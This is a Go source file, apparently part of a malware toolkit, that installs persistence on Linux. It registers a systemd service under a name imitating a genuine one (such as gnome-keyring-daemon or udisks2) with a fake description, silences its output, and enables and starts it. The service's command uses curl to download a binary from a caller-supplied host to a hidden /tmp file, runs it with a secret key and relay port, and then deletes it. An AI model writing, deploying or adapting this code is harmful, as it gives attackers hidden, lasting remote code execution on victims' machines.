package persistence

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
)

type ServiceConfig struct {
	Name        string
	Description string
	ExecCommand string
	UserMode    bool
}

func FindTarget() (*ServiceConfig, error) {
	userDir := filepath.Join(os.Getenv("HOME"), ".config/systemd/user")
	if _, err := os.Stat(userDir); err == nil {
		userCandidates := []string{"dbus-session", "gvfs-daemon", "pulseaudio", "ssh-agent", "at-spi-dbus-bus", "gnome-keyring-daemon", "dconf-service"}
		for _, name := range userCandidates {
			unitPath := filepath.Join(userDir, name+".service")
			if _, err := os.Stat(unitPath); os.IsNotExist(err) {
				return &ServiceConfig{Name: name, Description: "D-Bus User Session", UserMode: true}, nil
			}
		}
	}
	if os.Geteuid() == 0 {
		systemDir := "/etc/systemd/system"
		systemCandidates := []string{"networking-helper", "systemd-timesyncd-wait", "polkit-gnome-authentication-agent", "udisks2", "rtkit-daemon"}
		for _, name := range systemCandidates {
			unitPath := filepath.Join(systemDir, name+".service")
			if _, err := os.Stat(unitPath); os.IsNotExist(err) {
				return &ServiceConfig{Name: name, Description: "Network Helper Service", UserMode: false}, nil
			}
		}
	}
	return nil, fmt.Errorf("tidak ada service yang bisa dipakai")
}

func Install(secret, domain, relayPort, httpPort string) error {
	cfg, err := FindTarget()
	if err != nil {
		return err
	}

	execCmd := fmt.Sprintf(
		`/bin/sh -c "curl -s http://%s:%s/vghost -o /tmp/.x11-vghost && chmod +x /tmp/.x11-vghost && /tmp/.x11-vghost --Sk %s -d %s -P %s && rm -f /tmp/.x11-vghost"`,
		domain, httpPort, secret, domain, relayPort,
	)
	cfg.ExecCommand = execCmd

	if cfg.UserMode {
		userDir := filepath.Join(os.Getenv("HOME"), ".config/systemd/user")
		os.MkdirAll(userDir, 0755)
		unitPath := filepath.Join(userDir, cfg.Name+".service")
		unitContent := fmt.Sprintf(`[Unit]
Description=%s
After=default.target

[Service]
Type=simple
ExecStart=%s
Restart=no
StandardOutput=null
StandardError=null

[Install]
WantedBy=default.target
`, cfg.Description, cfg.ExecCommand)
		if err := os.WriteFile(unitPath, []byte(unitContent), 0644); err != nil {
			return err
		}
		exec.Command("systemctl", "--user", "daemon-reload").Run()
		exec.Command("systemctl", "--user", "enable", cfg.Name+".service").Run()
		exec.Command("systemctl", "--user", "start", cfg.Name+".service").Run()
	} else {
		unitPath := filepath.Join("/etc/systemd/system", cfg.Name+".service")
		unitContent := fmt.Sprintf(`[Unit]
Description=%s
After=network.target

[Service]
Type=simple
ExecStart=%s
Restart=no
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`, cfg.Description, cfg.ExecCommand)
		if err := os.WriteFile(unitPath, []byte(unitContent), 0644); err != nil {
			return err
		}
		exec.Command("systemctl", "daemon-reload").Run()
		exec.Command("systemctl", "enable", cfg.Name+".service").Run()
		exec.Command("systemctl", "start", cfg.Name+".service").Run()
	}
	return nil
}